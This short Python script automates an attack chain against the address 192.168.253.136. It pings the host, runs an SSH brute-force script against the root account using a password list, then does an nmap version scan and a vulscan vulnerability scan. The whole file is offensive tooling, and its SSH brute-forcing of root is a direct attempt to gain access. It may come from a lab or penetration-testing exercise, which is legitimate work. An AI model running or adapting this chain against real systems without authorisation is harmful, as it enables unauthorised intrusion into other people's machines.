#1. fping
#2. SSH-Brute-Force
#3. NSE ports scan
#4. NSE ports vulnerability

import os

os.system('ping 192.168.253.136 -c 15')
print("pfing Done!")

os.system('python3 SSH-Brute-Frorcer.py 192.168.253.136 root ipmi_passwords.txt')
print("SSH Done!")

os.system('nmap -sV 192.168.253.136')
print("NSE Done!")

os.system('nmap -sV --script=vulscan/vulscan.nse 192.168.253.136')
print("NSE vulnerability Done!")

print("Done!!!!")
